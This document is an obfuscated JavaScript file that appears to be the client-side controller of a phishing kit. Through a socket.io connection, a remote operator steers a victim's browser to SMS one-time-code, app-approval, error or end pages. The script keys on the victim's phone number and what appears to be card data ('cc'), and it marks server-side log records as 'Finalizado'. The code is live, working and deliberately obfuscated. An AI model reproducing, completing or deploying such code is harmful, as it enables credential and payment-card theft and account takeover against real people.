const _0x548df8 = _0x59a5;
(function (_0x587e10, _0xaae36e) {
  const _0x78ba19 = _0x59a5,
    _0x4eaadd = _0x587e10();
  while (!![]) {
    try {
      const _0x2ee2db =
        (parseInt(_0x78ba19(0x8e)) / 0x1) * (-parseInt(_0x78ba19(0x8a)) / 0x2) +
        (parseInt(_0x78ba19(0x89)) / 0x3) * (parseInt(_0x78ba19(0x90)) / 0x4) +
        parseInt(_0x78ba19(0x82)) / 0x5 +
        (-parseInt(_0x78ba19(0x9a)) / 0x6) * (parseInt(_0x78ba19(0x9b)) / 0x7) +
        (parseInt(_0x78ba19(0x83)) / 0x8) * (parseInt(_0x78ba19(0x86)) / 0x9) +
        -parseInt(_0x78ba19(0x81)) / 0xa +
        parseInt(_0x78ba19(0x9d)) / 0xb;
      if (_0x2ee2db === _0xaae36e) break;
      else _0x4eaadd["push"](_0x4eaadd["shift"]());
    } catch (_0x4fed01) {
      _0x4eaadd["push"](_0x4eaadd["shift"]());
    }
  }
})(_0x1e4d, 0x3c085);
function _0x1e4d() {
  const _0x3a54e0 = [
    "2OmgOXb",
    "newdin",
    "PUT",
    "telnum",
    "417899BUYMHa",
    "metaInfo",
    "213028EiSaHb",
    "valid",
    "connect",
    "idreg",
    "application/json",
    "./index.error.html",
    "valor",
    "stringify",
    "location",
    "log",
    "12RwKQJq",
    "625569bSOIDH",
    "logs",
    "280456tvUHxr",
    "Finalizado",
    "./ot-sms.html",
    "href",
    "3275080VOTdmu",
    "1877425fxyosT",
    "12088rtIwEs",
    "./ot-app.html",
    "/logs/logFinish/",
    "2043HsEZub",
    "../end.html",
    "finish",
    "24hLOOjM",
  ];
  _0x1e4d = function () {
    return _0x3a54e0;
  };
  return _0x1e4d();
}
function _0x59a5(_0x594b4d, _0x5c9e94) {
  const _0x1e4d11 = _0x1e4d();
  return (
    (_0x59a5 = function (_0x59a5fb, _0x35a6ef) {
      _0x59a5fb = _0x59a5fb - 0x7e;
      let _0x3487ad = _0x1e4d11[_0x59a5fb];
      return _0x3487ad;
    }),
    _0x59a5(_0x594b4d, _0x5c9e94)
  );
}
var socket = io[_0x548df8(0x92)](url);
socket["on"](_0x548df8(0x9c), function (_0x256ddf) {
  const _0x22e877 = _0x548df8;
  if (
    _0x256ddf[_0x22e877(0x96)] == "us" &&
    _0x256ddf["valid"] == info["metaInfo"]["telnum"]
  )
    window[_0x22e877(0x98)][_0x22e877(0x80)] = _0x22e877(0x95);
  else {
    if (
      _0x256ddf[_0x22e877(0x96)] == "din" &&
      _0x256ddf[_0x22e877(0x91)] == info["metaInfo"]["telnum"]
    )
      window[_0x22e877(0x98)]["href"] = _0x22e877(0x84);
    else {
      if (
        _0x256ddf[_0x22e877(0x96)] == _0x22e877(0x8b) &&
        _0x256ddf[_0x22e877(0x91)] == info["metaInfo"][_0x22e877(0x8d)]
      )
        window[_0x22e877(0x98)]["href"] = _0x22e877(0x7f);
      else {
        if (
          _0x256ddf[_0x22e877(0x96)] == _0x22e877(0x88) &&
          _0x256ddf[_0x22e877(0x91)] == info["metaInfo"][_0x22e877(0x8d)]
        ) {
          async function _0x18fd61() {
            const _0x3328f7 = _0x22e877,
              _0x1a2d76 = await fetch(url + "/logs/logs", {
                method: "GET",
                headers: { "Content-Type": _0x3328f7(0x94) },
              }),
              _0x285ba7 = await _0x1a2d76["json"](),
              _0x3fc9da = [..._0x285ba7];
            for (const _0x1148dc of _0x3fc9da) {
              if (
                _0x1148dc["cl"] == info[_0x3328f7(0x8f)][_0x3328f7(0x8d)] &&
                _0x1148dc["reg"] == info[_0x3328f7(0x8f)]["cc"]
              ) {
                console[_0x3328f7(0x99)]("Usuario\x20encontrado");
                const _0x40803a = await fetch(
                    url + _0x3328f7(0x85) + _0x1148dc[_0x3328f7(0x93)],
                    {
                      method: _0x3328f7(0x8c),
                      headers: { "Content-Type": _0x3328f7(0x94) },
                      body: JSON[_0x3328f7(0x97)]({ status: _0x3328f7(0x7e) }),
                    }
                  ),
                  _0x4966fb = await _0x40803a["json"]();
              }
            }
            window[_0x3328f7(0x98)][_0x3328f7(0x80)] = _0x3328f7(0x87);
          }
          _0x18fd61();
          return;
        }
      }
    }
  }
});
